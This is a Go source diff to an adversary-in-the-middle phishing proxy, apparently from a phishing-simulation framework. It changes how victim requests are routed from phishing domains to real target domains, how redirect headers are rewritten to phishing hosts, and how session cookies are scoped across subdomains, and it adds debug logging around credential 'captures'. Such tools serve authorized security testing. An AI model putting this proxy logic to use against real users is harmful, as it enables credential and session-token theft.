@@ -656,8 +656,9 @@ func (m *ProxyHandler) applySessionToRequestWithContext(req *http.Request, reqCt
 		}
 	}
 
-	// handle any request with campaign recipient id (initial or existing session)
-	if reqCtx.CampaignRecipientID != nil {
+	// handle initial request with campaign recipient id (from URL parameters)
+	// use session's original target domain only for initial landing
+	if reqCtx.CampaignRecipientID != nil && reqCtx.SessionCreated {
 		req.Host = reqCtx.Session.TargetDomain
 		req.URL.Scheme = "https"
 		req.URL.Host = reqCtx.Session.TargetDomain
@@ -672,10 +673,17 @@ func (m *ProxyHandler) applySessionToRequestWithContext(req *http.Request, reqCt
 		}
 		req.URL.RawQuery = q.Encode()
 	} else {
-		// for subsequent requests, map to original host
-		originalHost := m.replaceHostWithOriginal(req.Host, reqCtx.ConfigMap)
-		req.Host = originalHost
-		req.URL.Host = originalHost
+		// for subsequent requests with session but no campaign recipient id,
+		// use current domain's target instead of session's original target
+		// this allows cross-domain requests to work correctly
+		targetDomain := reqCtx.TargetDomain
+		if targetDomain == "" {
+			// fallback to mapping from phishing host
+			targetDomain = m.replaceHostWithOriginal(req.Host, reqCtx.ConfigMap)
+		}
+		req.Host = targetDomain
+		req.URL.Host = targetDomain
+		req.URL.Scheme = "https"
 	}
 
 	// apply request processing
@@ -845,11 +853,14 @@ func (m *ProxyHandler) processResponseWithSessionContext(resp *http.Response, re
 }
 
 func (m *ProxyHandler) setSessionCookieWithContext(resp *http.Response, reqCtx *RequestContext) {
+	// extract top-level domain to make session cookie work across all subdomains
+	topLevelDomain := m.extractTopLevelDomain(reqCtx.PhishDomain)
+
 	cookie := &http.Cookie{
 		Name:     m.cookieName,
 		Value:    reqCtx.SessionID,
 		Path:     "/",
-		Domain:   "." + reqCtx.PhishDomain,
+		Domain:   "." + topLevelDomain,
 		Expires:  time.Now().Add(time.Duration(PROXY_COOKIE_MAX_AGE) * time.Second),
 		HttpOnly: true,
 		Secure:   true,
@@ -893,10 +904,35 @@ func (m *ProxyHandler) rewriteResponseHeadersWithContext(resp *http.Response, re
 
 	// fix location header
 	if location := resp.Header.Get("Location"); location != "" {
+		m.logger.Debugw("rewriting location header",
+			"original_location", location,
+			"phish_domain", reqCtx.PhishDomain,
+			"target_domain", reqCtx.TargetDomain)
+
 		if rURL, err := url.Parse(location); err == nil {
+			m.logger.Debugw("parsed location URL",
+				"host", rURL.Host,
+				"path", rURL.Path)
+
 			if phishHost := m.replaceHostWithPhished(rURL.Host, reqCtx.ConfigMap); phishHost != "" {
+				m.logger.Debugw("found phish host mapping",
+					"original_host", rURL.Host,
+					"phish_host", phishHost)
 				rURL.Host = phishHost
 				resp.Header.Set("Location", rURL.String())
+				m.logger.Debugw("rewrote location header",
+					"new_location", rURL.String())
+			} else {
+				m.logger.Debugw("no phish host mapping found for location",
+					"host", rURL.Host,
+					"config_map_size", len(reqCtx.ConfigMap))
+
+				// log all available mappings
+				for origHost, cfg := range reqCtx.ConfigMap {
+					m.logger.Debugw("available mapping",
+						"original_host", origHost,
+						"phish_host", cfg.To)
+				}
 			}
 		}
 	}
@@ -1465,10 +1501,21 @@ func (m *ProxyHandler) onResponseBody(resp *http.Response, body []byte, session 
 		originalHost = session.TargetDomain
 	}
 
+	m.logger.Debugw("onResponseBody: checking for captures",
+		"originalHost", originalHost,
+		"sessionTargetDomain", session.TargetDomain,
+		"requestURL", resp.Request.URL.String())
+
 	hostConfig, exists := m.getHostConfig(session, originalHost)
 	if !exists {
+		m.logger.Debugw("onResponseBody: no host config found",
+			"originalHost", originalHost)
 		return
 	}
+
+	m.logger.Debugw("onResponseBody: found host config",
+		"originalHost", originalHost,
+		"captureCount", len(hostConfig.Capture))
 
 	if hostConfig.Capture != nil {
 		for _, capture := range hostConfig.Capture {
@@ -2778,6 +2825,19 @@ func (m *ProxyHandler) setProxyConfigDefaults(config *service.ProxyServiceConfig
 			config.Global.Access.OnDeny = "404"
 		}
 	}
+}
+
+// extractTopLevelDomain extracts the top-level domain from a hostname
+// e.g., "login.proxysaurous.test" -> "proxysaurous.test"
+// e.g., "assets-1.proxysaurous.test" -> "proxysaurous.test"
+func (m *ProxyHandler) extractTopLevelDomain(hostname string) string {
+	parts := strings.Split(hostname, ".")
+	if len(parts) <= 2 {
+		// already a top-level domain or single word
+		return hostname
+	}
+	// return the last two parts (domain.tld)
+	return parts[len(parts)-2] + "." + parts[len(parts)-1]
 }
 
 func (m *ProxyHandler) GetCookieName() string {
